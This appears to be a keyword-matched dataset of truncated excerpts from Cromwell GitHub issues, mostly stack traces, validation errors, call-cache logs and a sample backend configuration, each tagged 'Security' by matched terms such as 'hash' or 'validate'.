common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:107); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript$(ConfigAsyncJobExecutionActor.scala:55); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:43); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs$(ConfigAsyncJobExecutionActor.scala:39); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs$lzycompute(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionAc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:1851,Validat,Validation,1851,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,2,['Validat'],"['Validation', 'ValidationTry']"
Security,"aterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; running cwltool on file /tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl failed with Traceback (most recent call last):; File ""/home/dyuen/dockstore_tools/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/heterodon/__init__.py"", line 24, in apply; File ""<string>"", line 1, in <module>; File ""<string>"", line 12, in cwltool_salad; File ""/home/dyuen/dockstore_tools/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/cwltool/load_tool.py"", line 279, in validate_document; File ""/home/dyuen/dockstore_tools/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/schema_salad/ref_resolver.py"", line 915, in resolve_all; File ""/home/dyuen/dockstore_tools/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/schema_salad/ref_resolver.py"", line 1087, in validate_links; schema_salad.validate.ValidationException: ../../../../tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl:24:1: checking field steps; ../../../../tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl:30:3: checking object ../../../../tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl#checker; ../../../../tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl:31:5: Field run contains undefined reference to file:///tmp/cwl_temp_dir_7264114231127246601/checker/md5sum_checker.cwl; ../../../../tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl:25:3: checking object ../../../../tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl#md5sum; ../../../../tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl:26:5: Field run contains undefined re",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4366:1991,validat,validate,1991,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4366,1,['validat'],['validate']
Security,ationException: 'nioPath' not implemented for SraPath; 	at cromwell.filesystems.sra.SraPath.nioPath(SraPathBuilder.scala:31); 	at cromwell.core.path.Path.nioPathPrivate(PathBuilder.scala:113); 	at cromwell.core.path.Path.nioPathPrivate$(PathBuilder.scala:113); 	at cromwell.filesystems.sra.SraPath.nioPathPrivate(SraPathBuilder.scala:26); 	at cromwell.core.path.PathObjectMethods.hashCode(PathObjectMethods.scala:18); 	at cromwell.core.path.PathObjectMethods.hashCode$(PathObjectMethods.scala:18); 	at cromwell.filesystems.sra.SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.actor.Actor.aroundReceive$(Actor.scala:537); 	at cromwell.engine.io.IoActorProxy.aroundReceive(IoActorProxy.scala:16); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:1207,hash,hashing,1207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,1,['hash'],['hashing']
Security,"attempt 1); [2022-12-15 21:22:59,84] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.year_of_birth:-1:1-20000000028 [9e4f5894main.year_of_birth:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:22:59,84] [info] BT-322 9e4f5894:main.year_of_birth:-1:1 cache hit copying success with aggregated hashes: initial = 09247459DDA5EA8DF661D5F490C81E8B, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:22:59,84] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.year_of_birth:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:00,36] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.phenotype:-1:1-20000000025 [9e4f5894main.phenotype:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:23:00,36] [info] BT-322 9e4f5894:main.phenotype:-1:1 cache hit copying success with aggregated hashes: initial = 018D1BC619E22671C2125EEDE82AB210, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,36] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.phenotype:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:00,37] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.date_of_death:-1:1-20000000026 [9e4f5894main.date_of_death:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:23:00,37] [info] BT-322 9e4f5894:main.date_of_death:-1:1 cache hit copying success with aggregated hashes: initial = 179EA0EE9B87629C24E64D33DEB38610, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,37] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.date_of_death:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:00,67] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-Backend",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:25622,hash,hashes,25622,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"available.; //filesystems {; // gcs {; // auth = ""application-default""; // }; //}; }. backend {; default = ""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 28; run-in-background = true; runtime-attributes = ""String? docker""; submit = ""/bin/bash ${script}""; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash < ${script}"". // Root directory where Cromwell writes job results. This directory must be; // visible and writeable by the Cromwell process as well as the jobs that Cromwell; // launches.; root: ""cromwell-executions"". filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; }. local {; // Cromwell makes a link to your input files within <root>/<workflow UUID>/workflow-inputs; // The following are strategies used to make those links. They are ordered. If one fails; // The next one is tried:; //; // hard-link: attempt to create a hard-link to the file; // copy: copy the file; // soft-link: create a symbolic link to the file; //; // NOTE: soft-link will be skipped for Docker jobs; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]; }; }; }; }; }; }. services {; KeyValue {; class = ""cromwell.services.keyvalue.impl.SqlKeyValueServiceActor""; }; MetadataService {; class = ""cromwell.services.metadata.impl.MetadataServiceActor""; }; }. database {; // This specifies which database to use; //config = main.hsqldb; config = main.mysql_localhost. main {; hsqldb {; driver = ""slick.driver.HsqldbDriver$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = ""jdbc:hsqldb:mem:${slick.uniqueSchema};shutdown=false;hsqldb.tx=mvcc""; connectionTimeout = 3000; }; }. mysql_localhost {; driver = ""slick.driver.MySQLDriver$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell""; user = ""root""; password = ""cromwell""; connectionTimeout = 5000; }; }; }; }. ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:89646,password,password,89646,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,1,['password'],['password']
Security,"a};shutdown=false;hsqldb.tx=mvcc; [2016-09-13 17:39:33,39] [info] WorkflowManagerActor submitWorkflow input id = None, effective id = 8eab0d5a-925a-4e99-ae3b-f30dfadacb58; Uncaught error from thread [cromwell-system-akka.actor.default-dispatcher-2] shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled for ActorSystem[cromwell-system]; java.lang.ExceptionInInitializerError; at cromwell.engine.backend.local.SharedFileSystem$class.rootPath(SharedFileSystem.scala:113); at cromwell.engine.backend.sge.SgeBackend.rootPath(SgeBackend.scala:47); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$1$1.apply(MaterializeWorkflowDescriptorActor.scala:87); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$1$1.apply(MaterializeWorkflowDescriptorActor.scala:86); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$1(MaterializeWorkflowDescriptorActor.scala:86); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2$$anonfun$apply$8.apply(MaterializeWorkflowDescriptorActor.scala:110); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2$$anonfun$apply$8.apply(MaterializeWorkflowDescriptorActor.scala:109); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2.apply(MaterializeWorkflowDescriptorActor.scala:109); at cromwell.engine.workflow.Materia",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1406:3564,Validat,ValidationFlatMap,3564,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1406,1,['Validat'],['ValidationFlatMap']
Security,"b/nvidia; + NVIDIA_INSTALL_DIR_CONTAINER=/usr/local/nvidia; + ROOT_MOUNT_DIR=/root; + CACHE_FILE=/usr/local/nvidia/.cache; + LOCK_FILE=/root/tmp/cos_gpu_installer_lock; + LOCK_FILE_FD=20; + set +x; [INFO 2020-08-04 23:40:07 UTC] Checking if this is the only cos-gpu-installer that is running.; [INFO 2020-08-04 23:40:07 UTC] Running on COS build id 12871.1174.0; [INFO 2020-08-04 23:40:07 UTC] Checking if third party kernel modules can be installed; [INFO 2020-08-04 23:40:07 UTC] Checking cached version; [INFO 2020-08-04 23:40:07 UTC] Cache file /usr/local/nvidia/.cache not found.; [INFO 2020-08-04 23:40:07 UTC] Did not find cached version, building the drivers...; [INFO 2020-08-04 23:40:07 UTC] Downloading GPU installer ...; [INFO 2020-08-04 23:40:09 UTC] Downloading from https://storage.googleapis.com/nvidia-drivers-us-public/tesla/418.40.04/NVIDIA-Linux-x86_64-418.40.04.run; ls: cannot access '/build/usr/src/linux': No such file or directory; [INFO 2020-08-04 23:40:11 UTC] Kernel sources not found locally, downloading; [INFO 2020-08-04 23:40:11 UTC] Kernel source archive download URL: https://storage.googleapis.com/cos-tools/12871.1174.0/kernel-src.tar.gz. real	0m2.220s; user	0m0.183s; sys	0m0.338s; [INFO 2020-08-04 23:40:18 UTC] Setting up compilation environment; [INFO 2020-08-04 23:40:18 UTC] Obtaining toolchain_env file from https://storage.googleapis.com/cos-tools/12871.1174.0/toolchain_env. real	0m0.126s; user	0m0.014s; sys	0m0.001s; [INFO 2020-08-04 23:40:18 UTC] Downloading toolchain from https://storage.googleapis.com/cos-tools/12871.1174.0/toolchain.tar.xz. real	0m11.907s; user	0m0.428s; sys	0m1.039s; [INFO 2020-08-04 23:41:17 UTC] Configuring environment variables for cross-compilation; [INFO 2020-08-04 23:41:17 UTC] Configuring installation directories; [INFO 2020-08-04 23:41:17 UTC] Updating container's ld cache; [INFO 2020-08-04 23:41:20 UTC] Configuring kernel sources; [INFO 2020-08-04 23:41:42 UTC] Modifying kernel version magic string in source files",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5714:3875,access,access,3875,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5714,1,['access'],['access']
Security,"b7ba-416f-964e-22ab8c7b38e3); 2019-07-02 19:16:37,248 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowManagerActor Successfully started WorkflowActor-10f172e8-b7ba-416f-964e-22ab8c7b38e3; 2019-07-02 19:16:37,248 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2019-07-02 19:16:37,271 cromwell-system-akka.dispatchers.engine-dispatcher-29 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2019-07-02 19:16:37,932 cromwell-system-akka.dispatchers.engine-dispatcher-29 ERROR - Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	at cromwell.filesystems.s3.S3PathBuilder$.fromAuthMode(S3PathBuilder.scala:118); 	at cromwell.filesystems.s3.S3PathBuilderFactory.withOptions(S3PathBuilderFactory.scala:59); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$s",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:1630,validat,validateCredential,1630,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
Security,box.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	Suppressed: java.nio.file.NoSuchFileException: /tmp/640585481854205084.zip4511378926145376874/bar/foo.wdl; 		at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86); 		at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102); 		at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107); 		at sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:214); 		at java.nio.file.Files.newByteChannel(Files.java:361); 		at java.nio.file.Files.newByteChannel(Files.java:407); 		at java.nio.file.Files.readAllBytes(Files.java:3152); 		at better.files.File.loadBytes(File.scala:163); 		at better.files.File.byteArray(File.scala:166); 		at better.files.File.contentAsString(File.scala:206); 		at wdl4s.WdlNamespace$.readFile(WdlNamespace.scala:525); 		at wdl4s.WdlNamespace$.fileResolver(WdlNamespace.scala:527); 		at wdl4s.WdlNamespace$.directoryResolver(WdlNamespace.scala:533); 		at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1$$anonfun$17.apply(MaterializeWorkflowDescriptorActor.scala:361); 		at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1$$anonfun$17.apply(MaterializeWorkflowDescriptorActor.scala:361); 		at wdl4s.WdlNamespace$$anonfun$16.apply(WdlNamespace.scala:191); 		at wdl4s.WdlNamespace$$anonfun$16.apply(WdlNamespace.scala:191); 		at scala.util.Try$.apply(Try.scala:192); 		at wdl4s.WdlNamespace$.wdl4s$WdlNamespace$$tryResolve$1(WdlNamespace.scala:191); 		... 37 common frames omitted. ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1958:5516,validat,validateNamespaceWithImports,5516,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1958,2,['validat'],['validateNamespaceWithImports']
Security,"broadinstitute.jfrog.io/broadinstitute/libs-release/org/broadinstitute/heterodon/1.0.0-beta1/heterodon-1.0.0-beta1-single.jar/Lib/heterodon/__init__.py"", line 24, in apply; File ""<string>"", line 1, in <module>; File ""<string>"", line 12, in cwltool_salad; File ""/Users/anichols/Library/Caches/Coursier/v1/https/broadinstitute.jfrog.io/broadinstitute/libs-release/org/broadinstitute/heterodon/1.0.0-beta1/heterodon-1.0.0-beta1-single.jar/Lib/cwltool/load_tool.py"", line 279, in validate_document; File ""/Users/anichols/Library/Caches/Coursier/v1/https/broadinstitute.jfrog.io/broadinstitute/libs-release/org/broadinstitute/heterodon/1.0.0-beta1/heterodon-1.0.0-beta1-single.jar/Lib/schema_salad/ref_resolver.py"", line 915, in resolve_all; File ""/Users/anichols/Library/Caches/Coursier/v1/https/broadinstitute.jfrog.io/broadinstitute/libs-release/org/broadinstitute/heterodon/1.0.0-beta1/heterodon-1.0.0-beta1-single.jar/Lib/schema_salad/ref_resolver.py"", line 1087, in validate_links; schema_salad.validate.ValidationException: ../../../../../var/folders/g_/4k204pzx6sg6gcnqc2bqfykxx8k880/T/c8eb79b9-eee9-4796-b374-4841ff18a27d.temp.3969925185320342713/c8eb79b9-eee9-4796-b374-4841ff18a27d.cwl:11:1: checking field `steps`; ../../../../../var/folders/g_/4k204pzx6sg6gcnqc2bqfykxx8k880/T/c8eb79b9-eee9-4796-b374-4841ff18a27d.temp.3969925185320342713/c8eb79b9-eee9-4796-b374-4841ff18a27d.cwl:19:3: checking object `../../../../../var/folders/g_/4k204pzx6sg6gcnqc2bqfykxx8k880/T/c8eb79b9-eee9-4796-b374-4841ff18a27d.temp.3969925185320342713/c8eb79b9-eee9-4796-b374-4841ff18a27d.cwl#compile`; ../../../../../var/folders/g_/4k204pzx6sg6gcnqc2bqfykxx8k880/T/c8eb79b9-eee9-4796-b374-4841ff18a27d.temp.3969925185320342713/c8eb79b9-eee9-4796-b374-4841ff18a27d.cwl:20:5: Field `run` contains undefined reference to `file:///var/folders/g_/4k204pzx6sg6gcnqc2bqfykxx8k880/T/c8eb79b9-eee9-4796-b374-4841ff18a27d.temp.3969925185320342713/arguments.cwl`; ../../../../../var/folders/g_/4k204pzx6sg6gcnqc2bqfykxx8k880/T/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4190:1610,validat,validate,1610,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4190,1,['validat'],['validate']
Security,"c5a8-4c3a-9356-531b3cf0f2da failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; running cwltool on file /tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl failed with Traceback (most recent call last):; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/heterodon/__init__.py"", line 24, in apply; File ""<string>"", line 1, in <module>; File ""<string>"", line 12, in cwltool_salad; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/cwltool/load_tool.py"", line 279, in validate_document; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/schema_salad/ref_resolver.py"", line 915, in resolve_all; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/schema_salad/ref_resolver.py"", line 1087, in validate_links; schema_salad.validate.ValidationException: ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:24:1: checking field steps; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:30:3: checking object ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl#checker; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:31:5: Field run contains undefined reference to file:///tmp/cwl_temp_dir_2148913290991206234/checker/md5sum_checker.cwl; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:25:3: checking object ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl#md5sum; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:26:5: Field run contains undefined re",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4366#issuecomment-437395477:3419,validat,validate,3419,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4366#issuecomment-437395477,1,['validat'],['validate']
Security,"caching benchmarking on the [BioWDL RNA-seq](https://github.com/biowdl/RNA-seq) pipeline and it turns out any `path` or `path+modtime` strategies do not work with containers. As is reported in these issues: #5405, #5370, #5346 . @cmarkello, @illusional, I am sorry that I insisted that `path+modtime` did work. I was using less complex workflows that did not have this problem at the time. ## Call-caching problems with file strategy; The `file` strategy does work as it uses md5sums in order to calculate the file hash. An unfortunate side effect of this is that md5 uses massive system resources. On HPC systems that are the target for the sfs-backend, this is a big problem. Cromwell will be run from a submit node on the system and greedily grab all processing power on the submit node to calculate all the md5sums. . ## Md5sums; Md5sums are reliable hashes for file integrity, but this was not their intended purpose. Md5sum was intended as a cryptographic hash. A cryptographic hash has the following properties (wikipedia):; 1. it is deterministic, meaning that the same message always results in the same hash; 2. it is quick to compute the hash value for any given message; 3. it is infeasible to generate a message that yields a given hash value; 4. it is infeasible to find two different messages with the same hash value; 5. a small change to a message should change the hash value so extensively that the new hash value appears uncorrelated with the old hash value (avalanche effect). I contest point 2, in that many cryptographic explicitly strife for being slow to calculate in order to negate brute force attempts.; Anyway: for call caching we only need points 1. and 4. All the rest is unnecessary ballast. . ## xxHash; Luckily there is a hashing algorithm that is designed explicitly for content hashing only. It was made to generate reliably different hashes for file content as fast as possible. It's called [xxHash](https://www.xxhash.com). There are Java implementations availabl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450:1056,hash,hash,1056,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450,1,['hash'],['hash']
Security,cala:28); wom.transforms.WomBundleMaker$Ops.toWomBundle(WomExecutableMaker.scala:16); wom.transforms.WomBundleMaker$Ops.toWomBundle$(WomExecutableMaker.scala:16); wom.transforms.WomBundleMaker$ops$$anon$2.toWomBundle(WomExecutableMaker.scala:16); wdl.transforms.base.wdlom2wom.FileElementToWomBundle$.convert(FileElementToWomBundle.scala:81); wdl.transforms.base.wdlom2wom.package$.$anonfun$fileElementToWomBundle$1(package.scala:12); scala.util.Either$RightProjection.flatMap(Either.scala:702); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:36); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:32); cats.data.Kleisli.$anonfun$andThen$1(Kleisli.scala:37); languages.wdl.draft3.WdlDraft3LanguageFactory.getWomBundle(WdlDraft3LanguageFactory.scala:50); languages.wdl.draft3.WdlDraft3LanguageFactory.$anonfun$validateNamespace$2(WdlDraft3LanguageFactory.scala:39); scala.util.Either.flatMap(Either.scala:338); languages.wdl.draft3.WdlDraft3LanguageFactory.validateNamespace(WdlDraft3LanguageFactory.scala:38); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$buildWorkflowDescriptor$7(MaterializeWorkflowDescriptorActor.scala:242); cats.data.EitherT.$anonfun$flatMap$1(EitherT.scala:80); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:138); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$ano,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6999:11472,validat,validateNamespace,11472,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6999,1,['validat'],['validateNamespace']
